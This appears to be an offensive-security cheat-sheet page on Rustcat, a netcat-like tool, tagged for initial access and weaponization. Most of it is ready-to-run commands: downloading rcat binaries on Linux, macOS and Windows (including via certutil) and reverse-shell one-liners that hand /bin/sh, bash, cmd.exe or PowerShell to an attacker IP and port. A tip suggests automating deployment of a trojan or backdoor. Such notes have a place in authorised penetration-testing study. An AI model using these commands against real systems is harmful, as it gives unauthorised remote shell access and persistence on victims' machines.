---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - rustcat
---
# Rustcat

## 01 - Download Pre-compiled Payload

> [!TIP]
> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access.

### 1.1 - Linux

```
$ wget -qO rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64

$ curl -so rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64
```

### 1.2 - OSX

```
$ wget -qO rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-aarch64

$ curl -so rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-aarch64
```

```
$ wget -qO rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-x86_64

$ curl -so rcat https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-x86_64
```

### 1.3 - Windows

```
C:\> certutil.exe -urlcache -split -f https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-win-x86_64.exe rcat.exe

C:\> curl.exe -o rcat.exe https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-win-x86_64.exe
```

```
PS C:\> Invoke-WebRequest -Uri https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-win-x86_64.exe -OutFile rcat.exe
```

## 02 - Reverse Shell

```
$ ./rcat c -s </bin/sh | /bin/bash> <attacker_IP> <attacker_PORT>
```

```
C:\> .\rcat.exe c -s <cmd.exe | powershell.exe> <attacker_IP> <attacker_PORT>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Shell Handler/Cross Platform/Manual/Netcat Variants/Rustcat]]